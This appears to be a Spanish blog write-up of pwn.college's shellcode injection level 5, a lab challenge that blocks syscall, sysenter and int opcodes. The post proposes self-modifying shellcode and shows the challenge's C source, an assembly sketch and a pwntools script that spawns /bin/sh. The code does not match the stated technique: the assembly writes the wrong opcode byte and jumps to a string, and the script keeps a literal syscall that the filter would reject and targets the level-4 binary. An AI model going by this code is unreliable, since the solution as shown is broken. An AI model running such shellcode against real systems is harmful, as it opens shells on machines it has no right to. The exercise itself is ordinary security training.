---
layout: post
title: Shellcode Injection Dojo - level 5
comments: true
categories: [Pwn, Writeups, Pwn.college]
---

En esta serie de posts nos dedicaremos a resolver los ejercicios de *shellcoding* de [pwn.college](https://pwn.college/program-security/shellcode-injection/). En el post anterior estuvimos bypaseando una comprobación de un byte específico, en este se nos restringe el uso de varios *opcodes* importantes.

<br>
![Image]({{ site.baseurl }}/images/posts/pwn-college/yellow.svg){:width="200px"}
<br>

# Reconocimiento

En `/challenge/babyshell-level-5.c` tenemos el código:


```c
void *shellcode;
size_t shellcode_size;

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    puts("This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
    puts("as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
    puts("practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
    puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
    for (int i = 3; i < 10000; i++) close(i);
    for (char **a = argv; *a != NULL; a++) memset(*a, 0, strlen(*a));
    for (char **a = envp; *a != NULL; a++) memset(*a, 0, strlen(*a));

    shellcode = mmap((void *)0x17ab1000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x17ab1000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes from stdin.\n");
    shellcode_size = read(0, shellcode, 0x1000);
    assert(shellcode_size > 0);

    puts("Executing filter...\n");
    puts("This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls");
    puts("are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05");
    puts("(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to");
    puts("insert the `syscall` instructions at runtime.\n");
    for (int i = 0; i < shellcode_size; i++)
    {
        uint16_t *scw = (uint16_t *)((uint8_t *)shellcode + i);
        if (*scw == 0x80cd || *scw == 0x340f || *scw == 0x050f)
        {
            printf("Failed filter at byte %d!\n", i);
            exit(1);
        }
    }

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");
    ((void(*)())shellcode)();

    printf("### Goodbye!\n");
}
```

Simplemente lee `0x1000 bytes` y los ejecuta, pero en este caso, no podremos utilizar `syscall` (`0x0f05`), `sysenter` (`0x0f34`), ni `int` (`0x80cd`).

# Explotación

Para este caso, como nos sugiere el propio enunciado, podemos utilizar un shellcode *automodificante* (*self-modifying*). La idea es la siguiente:

1. `rdi` contendrá un puntero a `/bin/sh`, `rsi` y `rdx` serán `NULL` (los argumentos de `execve`).
2. Pondremos el puntero de `rdi` en el stack (`rsp`) y a `rsi` apuntando a dicho puntero (primer argumento de la syscall).
3. Insertaremos el  opcode de syscall en dos tiempos.
4. Saltaremos a syscall.

En ensamblador sería algo así:

```java
; Prepare the registers for execve("/bin/sh")
xor rdi, rdi            ; rdi = 0
xor rsi, rsi            ; rsi = 0
xor rdx, rdx            ; rdx = 0
xor rbx, rbx            ; rbx = 0

mov byte ptr rbx, 0x0f
push rbx
mov byte ptr rbx, 0x04
push rbx

mov rbx, 0x0068732f6e69622f  ; '/bin/' in hexadecimal
push rbx                     ; Push '/bin/' onto the stack
xor rbx, rbx                 ; Clear rbx (set to 0)
push rbx                     ; Push NULL byte onto the stack to form '/bin//sh'
mov rbx, 0x68732f2f          ; '/sh' in hexadecimal
push rbx                     ; Push '/sh' onto the stack

mov rdi, rsp                ; rdi = address of "/bin/sh"

; Jump to the location where `syscall` is written
jmp rdi                      ; Jump to the location of `syscall`

```

## Script


```python
#! /bin/python3

from pwn import *

context.arch = 'amd64'

shellcode = asm("""
    push 0x68
    push 0x6e69622f
    mov dword ptr [rsp+4], 0x732f2f2f
    push rsp
    pop rdi
    push 0x2d006873
    mov dword ptr [rsp+4], 0x70
    xor esi, esi
    push rsi
    push rsp
    add dword ptr [rsp], 0xb
    push rsp
    add dword ptr [rsp], 0x10
    push rsp
    pop rsi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
""")

print(shellcode)

print(asm("""
    xor rdi, rdi"""))

p = process("/challenge/babyshell-level-4")

p.send(shellcode)

p.interactive()
```

<br>
![Image]({{ site.baseurl }}/images/posts/pwn-college/shellcoding-level-4-flag.png){:width="700px"}
<br>